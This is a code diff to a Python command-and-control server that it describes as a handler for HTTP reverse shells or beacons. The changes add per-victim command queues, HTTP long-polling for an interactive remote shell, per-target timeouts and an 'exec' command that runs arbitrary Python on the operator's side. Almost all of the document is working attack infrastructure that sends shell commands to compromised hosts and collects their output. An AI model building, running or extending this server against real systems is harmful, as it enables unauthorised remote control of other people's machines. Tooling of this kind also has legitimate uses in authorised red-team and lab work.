@@ -11,6 +11,11 @@ from prompt_toolkit.patch_stdout import patch_stdout
 import argparse
 
 import os
+import time
+
+import select
+import queue
+from multiprocessing import Queue
 
 parser=argparse.ArgumentParser(description='A simple, interactive HTTP handler for HTTP reverse shells or beacons')
 parser.add_argument('-p',"--port", default=80, type=int, required=False, help="The port to listen on")
@@ -19,35 +24,55 @@ parser.add_argument('-k',"--keyfile", default="key.pem", required=False, help="T
 parser.add_argument('-c',"--certfile", default="cert.pem", required=False, help="The path to the SSL certificate file")
 parser.add_argument('-s',"--ssl", required=False, action="store_true", help="Enable SSL mode")
 parser.add_argument("--setup", required=False, action="store_true", help="Generate SSL certificate and key, then exit")
+parser.add_argument('-t',"--timeout", default=0, type=int, required=False, help="The default number of milliseconds to stall a GET request before replying. -1 will stall as long as the client is willing (HTTP Long-Polling). Any setting but 0 may cause DoS if a backdoored command makes a request in the foreground.")
 
 args = parser.parse_args()
 
 target = "*"
-tasks = {target:[]}
+tasks = {target:Queue()}
+
+target_settings = {}
 
 cmd_escape=":"
 sep = "\n"
+
+def load_target(target):
+    tasks[target] = Queue()
+    target_settings[target] = {
+        "timeout":args.timeout
+    }
+
+def get_all(queues, timeout):
+    items = []
+    files = [q._reader for q in queues]
+    (ready,[],[]) = select.select(files,[],[], timeout if timeout >= 0 else None)
+    ready_queues = [q for q in queues if q._reader in ready]
+    for r in ready_queues:
+        while True:
+            try:
+                items.append(r.get(block=False))
+            except queue.Empty:
+                break
+    return items
 
 class C2(BaseHTTPRequestHandler):
     def do_GET(self):
         client = self.client_address[0]
         if client not in tasks:
-            tasks[client] = []
+            load_target(client)
             print("New Client Connected: {}".format(client))
-        tasks[client].extend(tasks["*"])
-        num_cmds = len(tasks["*"])
-        if num_cmds > 0:
-            print("{} consumed {} tasks for *".format(client, num_cmds))
-        cmd_str = sep.join(tasks[client]).encode()
+        cmds = get_all([tasks['*'], tasks[client]], target_settings[client]["timeout"])
+        cmd_str = sep.join(cmds).encode()
+
         self.send_response(200)
         self.send_header('Content-Length', len(cmd_str))
         self.end_headers()
         self.wfile.write(cmd_str)
-        num_cmds = len(tasks[client])
+        num_cmds = len(cmds)
         if num_cmds > 0:
             print("{} Commands sent to {}".format(num_cmds, client))
-        tasks[client] = []
-        tasks["*"] = []
+        tasks[client] = Queue()
+        tasks["*"] = Queue()
 
     def do_POST(self):
         host = self.client_address[0]
@@ -100,6 +125,8 @@ def show_help():
                 "targets", 
                 "set target X.X.X.X", 
                 "set target *", 
+                "set timeout X", 
+                "interactive", 
                 "exit",
                 "cancel",
                 "clear",
@@ -112,46 +139,57 @@ def show_help():
 #  or None if no command should be delivered
 def prepare(cmd):
     global target
-
-    # If it is a special command
-    if cmd.startswith(cmd_escape):
-        cmd = cmd[len(cmd_escape):]
-        if cmd == "tasks":
-            show_tasks()
-            return None
-        elif cmd == "targets":
-            show_targets()
-            return None
-        elif cmd.startswith("set target "):
-            target = cmd[len("set target "):]
-            if not target in tasks:
-                print("Creating tasks queue for {}".format(target))
-                tasks[target] = []
-            return None
-        elif cmd == "exit":
-            print("Shutting down the server...")
-            os._exit(0)
-        elif cmd == "cancel":
+    try:
+        # If it is a special command
+        if cmd.startswith(cmd_escape):
+            cmd = cmd[len(cmd_escape):]
+            if cmd == "tasks":
+                show_tasks()
+                return None
+            elif cmd == "targets":
+                show_targets()
+                return None
+            elif cmd.startswith("set target "):
+                target = cmd[len("set target "):]
+                if not target in tasks:
+                    print("Creating tasks queue for {}".format(target))
+                    tasks[target] = Queue()
+                return None
+            elif cmd.startswith("set timeout "):
+                target_settings[target]["timeout"] = int(cmd[len("set timeout "):])
+            elif cmd == "interactive":
+                if target == "*":
+                    print("Set a target first")
+                target_settings[target]["timeout"] = -1
+            elif cmd.startswith("exec "):
+                exec(cmd[len("exec "):])
+            elif cmd == "exit":
+                print("Shutting down the server...")
+                os._exit(0)
+            elif cmd == "cancel":
+                if target:
+                    print("Canceling all tasks for {}".format(target))
+                    tasks[target] = Queue()
+            elif cmd == "clear":
+                prompt_toolkit.shortcuts.clear()
+            else:
+                show_help()
+                return None
+        else:
             if target:
-                print("Canceling all tasks for {}".format(target))
-                tasks[target] = []
-        elif cmd == "clear":
-            prompt_toolkit.shortcuts.clear()
-        else:
-            show_help()
-            return None
-    else:
-        if target:
-            return cmd
-        else:
-            print("No target set. Try '{}' or '{}'".format("targets", ":set target *"))
-            return None 
+                return cmd
+            else:
+                print("No target set. Try '{}' or '{}'".format("targets", ":set target *"))
+                return None 
+    except Exception as e:
+        print(e)
 
 def main():
     if args.setup:
         os.system('openssl req -nodes -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365')
         print("key.pem and cert.pem created")
         return
+    load_target("*")
     httpd = HTTPServer((args.address, args.port), C2)
     if args.ssl:
         httpd.socket = ssl.wrap_socket (httpd.socket, 
@@ -169,7 +207,7 @@ def main():
                 cmd = session.prompt("{}>".format(target))
                 cmd = prepare(cmd)
                 if cmd:
-                    tasks[target].append(cmd)
+                    tasks[target].put(cmd)
                     print("Command queued for {}".format(target))
                 #print(tasks)
         except Exception as e:
